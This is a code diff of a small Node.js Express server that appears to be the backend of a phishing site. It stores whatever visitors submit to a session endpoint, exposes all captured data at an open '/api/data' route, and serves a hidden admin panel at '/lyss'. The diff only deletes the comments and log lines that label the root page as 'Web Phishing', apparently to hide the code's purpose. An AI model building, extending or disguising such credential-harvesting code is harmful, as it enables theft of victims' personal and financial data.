@@ -31,7 +31,6 @@ let webConfig = {
     receiver_account: 'JBIC-002'
 };
 
-// ===== API DATA =====
 app.post('/api/session', (req, res) => {
     dataStore.sessions.push({ ...req.body, time: new Date().toLocaleString('id-ID') });
     res.json({ success: true });
@@ -65,18 +64,14 @@ app.get('/api/data', (req, res) => {
     res.json({ success: true, data: dataStore });
 });
 
-// ===== ADMIN PANEL DI /lyss =====
 app.get('/lyss', (req, res) => {
     res.sendFile(path.join(__dirname, 'admin.html'));
 });
 
-// ===== WEB PHISHING DI / =====
 app.get('/', (req, res) => {
     res.sendFile(path.join(__dirname, 'index.html'));
 });
 
 app.listen(PORT, () => {
     console.log('Server running on port ' + PORT);
-    console.log('Web Phishing: /');
-    console.log('Admin Panel: /lyss');
 });
